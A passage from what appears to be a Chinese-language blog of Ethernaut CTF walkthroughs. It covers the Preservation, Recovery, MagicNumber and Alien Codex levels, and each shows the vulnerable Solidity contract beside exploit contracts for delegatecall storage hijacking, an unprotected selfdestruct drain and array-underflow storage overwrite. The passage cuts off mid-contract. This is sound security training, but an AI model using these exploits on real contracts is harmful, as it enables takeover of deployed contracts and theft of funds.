class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-14\"><a href=\"#Analyze-14\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p>学习过程参考<a name=\"13.Delegatecall\">13.Delegatecall</a></p>\n<h2 id=\"Attzck\"><a href=\"#Attzck\" class=\"headerlink\" title=\"Attzck\"></a>Attzck</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token builtin\">address</span> a<span class=\"token punctuation\">;</span>\n<span class=\"token builtin\">address</span> b<span class=\"token punctuation\">;</span>\n<span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">;</span><span class=\"token comment\">//将owner初始化在slot2，即可使修改的数据为被攻击合约的slot2</span>\nPreservation target<span class=\"token operator\">=</span><span class=\"token function\">Preservation</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x7ad5909C5ACde5A2a5B548280F980844e2564102</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">changetimeZone1Library</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> a<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    target<span class=\"token punctuation\">.</span><span class=\"token function\">setFirstTime</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//第一次调用将timeZone1Library改变为攻击合约地址</span>\n<span class=\"token comment\">//再次调用则是调用攻击合约地址下的setTime(uint256)，此时即可执行攻击代码</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">setTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n     owner<span class=\"token operator\">=</span>tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//折磨了好久又是oog，果然存在call就要注意gas限制的问题</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"17-Recovery\"><a href=\"#17-Recovery\" class=\"headerlink\" title=\"17.Recovery\"></a>17.Recovery</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent <code>0.5</code> ether to obtain more tokens. They have since lost the contract address.This level will be completed if you can recover (or remove) the <code>0.5</code> ether from the lost contract address.</p></blockquote>\n<h2 id=\"Code-16\"><a href=\"#Code-16\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Recovery</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token comment\">//generate tokens</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">generateToken</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _name<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _initialSupply<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">new</span> <span class=\"token class-name\">SimpleToken</span><span class=\"token punctuation\">(</span>_name<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> _initialSupply<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  \n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SimpleToken</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// public variables</span>\n  <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> name<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> balances<span class=\"token punctuation\">;</span>\n\n  <span class=\"token comment\">// constructor</span>\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _name<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _creator<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _initialSupply<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    name <span class=\"token operator\">=</span> _name<span class=\"token punctuation\">;</span>\n    balances<span class=\"token punctuation\">[</span>_creator<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _initialSupply<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token comment\">// collect ether in return for tokens</span>\n  <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n    balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token comment\">// allow transfers of tokens</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span> \n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>_amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    balances<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _amount<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token comment\">// clean up after ourselves</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">destroy</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> _to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">selfdestruct</span><span class=\"token punctuation\">(</span>_to<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-15\"><a href=\"#Analyze-15\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p>题目说creator在进行部署合约后进行了合约交互创建了SimpleToken合约并转入了0.5eth，但SimpleToken合约地址丢失,但是这些操作是在实例地址下进行的，打开区块链浏览器后查询实例地址并结合题目要求分析实例下的交易</p>\n<p>①获得实例地址</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281245742.png\"></p>\n<p>②查看进行过的交易并进行分析</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281245651.png\"></p>\n<ol>\n<li>结合题目可知关卡地址为0x0EB8e4771ABA41B70d0cb6770e04086E5aee5aB2，所以操作一是我们单机创建新实例产生的交易</li>\n<li>题目说creator进行了对generateToken的调用创建了一个SimpleToken合约，所以操作二是creator调用函数进行合约交互</li>\n<li>题目说creator进行了对generateToken的调用创建了一个SimpleToken合约，所以操作三是创建了SimpleToken合约(0xFc777940566cE74f839101ba1842be4B6f69EDC2)</li>\n<li>所以creator是想这个合约转账了0.5eth，该合约下又有public的selfdestruct函数destroy，所以直接构建攻击合约调用destroy函数即可</li>\n</ol>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281245178.png\"></p>\n<h2 id=\"Attack-14\"><a href=\"#Attack-14\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SimpleToken</span> <span class=\"token punctuation\">&#123;</span>\n <span class=\"token keyword\">function</span> <span class=\"token function\">destroy</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> _to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">selfdestruct</span><span class=\"token punctuation\">(</span>_to<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    SimpleToken target <span class=\"token operator\">=</span> <span class=\"token function\">SimpleToken</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFc777940566cE74f839101ba1842be4B6f69EDC2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> to<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">destroy</span><span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"18-MagicNumber\"><a href=\"#18-MagicNumber\" class=\"headerlink\" title=\"18.MagicNumber\"></a>18.MagicNumber</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：To solve this level, you only need to provide the Ethernaut with a <code>Solver</code>, a contract that responds to <code>whatIsTheMeaningOfLife()</code> with the right number.Easy right? Well… there’s a catch.The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 opcodes at most.Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode.Good luck!</p></blockquote>\n<h2 id=\"Code-17\"><a href=\"#Code-17\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">MagicNum</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> solver<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">setSolver</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _solver<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    solver <span class=\"token operator\">=</span> _solver<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-16\"><a href=\"#Analyze-16\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p><a href=\"https://medium.com/@blockchain101/solidity-bytecode-and-opcode-basics-672e9b1a88c2\">学习链接①</a></p>\n<p><a href=\"https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2\">学习链接②</a></p>\n<p><a href=\"https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737/\">学习链接③</a></p>\n<p>构建data：</p>\n<p>首先，42这个数字来的太不轻松了！！！</p>\n<p><img src=\"https://storage.tttang.com/media/attachment/2022/04/08/33d81465-f6c0-4ce2-9b18-7c191ac9efdf.png\"></p>\n<p>①先构建runtime codes：0x60 0x2a 0x60 0x80 0x52 0x60 0x20 0x60 0x80 0xf3</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#123;\n0x602a     ;PUSH1 0x2a                  v\n0x6080     ;PUSH1 0x80                  p\n0x52       ;MSTORE\n&#125;&#x2F;&#x2F;mstore(p, v) p代表position位置，v代表value值\n&#123;\n0x6020     ;PUSH1 0x20                  s\n0x6080     ;PUSH1 0x80                  p\n0xf3       ;RETURN\n&#125;&#x2F;&#x2F;return(p,s)p代表position位置，s代表size存储所占大小\n所以runtime codes：602a60805260206080f3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>②构建initialization codes：0x60 0x0a 0x60 0x?? 0x60 0x00 0x39 0x60 0x0a 0x60 0x00 0xf3</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">copy code&#123;\n0x600a     ;PUSH1 0x0a                     S(runtime code size)\n0x60??     ;PUSH1 0x??                     F(current position of runtime opcodes)\n0x6000     ;PUSH1 0x00                     T(destination memory index 0)\n0x39       ;CODECOPY\n&#125;&#x2F;&#x2F;codecopy(t, f, s)t代表target目标位置，f代表runtime codes位置，s代表size代码大小\nreturn code&#123;\n0x600a     ;PUSH1 0x0a                     S\n0x6000     ;PUSH1 0x00                     P\n0xf3       ;RETURN\n&#125;&#x2F;&#x2F;return(p,s)p代表position位置，s代表size存储所占大小\ninitialization codes占用了12个字节，所以??应该是0c\n所以initialization codes：600a600c600039600a6000f3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>③得到data：600a600c60&#x3D;&#x3D;00&#x3D;&#x3D;39600a60&#x3D;&#x3D;00&#x3D;&#x3D;f3602a60&#x3D;&#x3D;80&#x3D;&#x3D;52602060&#x3D;&#x3D;80&#x3D;&#x3D;f3(高亮部分非唯一答案，比如600a600c60&#x3D;&#x3D;10&#x3D;&#x3D;39600a60&#x3D;&#x3D;10&#x3D;&#x3D;f3602a60&#x3D;&#x3D;70&#x3D;&#x3D;52602060&#x3D;&#x3D;70&#x3D;&#x3D;f3)</p>\n<h2 id=\"Attack-15\"><a href=\"#Attack-15\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\">await <span class=\"token function\">sendTransaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">:</span>player<span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">:</span><span class=\"token number\">600</span>a600c601039600a6010f3602a60705260206070f3<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n <span class=\"token comment\">//创建合约根据交易哈希获得合约地址</span>\n <span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n      MagicNum target<span class=\"token operator\">=</span><span class=\"token function\">MagicNum</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x397175529CC088e12C7bb281403F2a15aDD6c9a5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> a<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n          target<span class=\"token punctuation\">.</span><span class=\"token function\">setSolver</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//传入刚刚创建的地址，进行调用</span>\n  <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"19-Alien-Codex\"><a href=\"#19-Alien-Codex\" class=\"headerlink\" title=\"19.Alien Codex\"></a>19.Alien Codex</h1><h2 id=\"Code-18\"><a href=\"#Code-18\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">'../helpers/Ownable-05.sol'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">AlienCodex</span> <span class=\"token keyword\">is</span> Ownable <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> contact<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> codex<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">modifier</span> <span class=\"token function\">contacted</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span>contact<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  \n  <span class=\"token keyword\">function</span> <span class=\"token function\">make_contact</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    contact <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">record</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> _content<span class=\"token punctuation\">)</span> contacted <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n  \tcodex<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>_content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">retract</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> contacted <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    codex<span class=\"token punctuation\">.</span>length<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">revise</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> i<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes32</span> _content<span class=\"token punctuation\">)</span> contacted <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    codex<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _content<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-17\"><a href=\"#Analyze-17\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p>这一关利用了 EVM 不会验证一个数组的 ABI-encoded 长度和他真实的payload的问题.</p>\n<p>并且他利用了数组长度的算数下溢, 通过扩大数组到整个 <code>2^256</code> 的存储区域. 然后用户就可以更改所有合约的storage了.</p>\n<p>这两个漏洞都是受这个启发 <a href=\"https://medium.com/@weka/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079\">Underhanded coding contest</a></p>\n<h2 id=\"Attack-16\"><a href=\"#Attack-16\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">AlienCodex</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">make_contact</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">record</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> _content<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">retract</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token keyword\">external</span> <span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">revise</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> i<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes32</span> _content<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attack</span> <span class=\"token punctuation\">&#123;</span>\n    AlienCodex target <span class=\"token operator\">=</span> <span class=\"token function\">AlienCodex</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x53c5A404b93e96DA6b913c222b728E8825f987E5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">public</span> payload <span class=\"token operator\">=</span> <span class=\"token 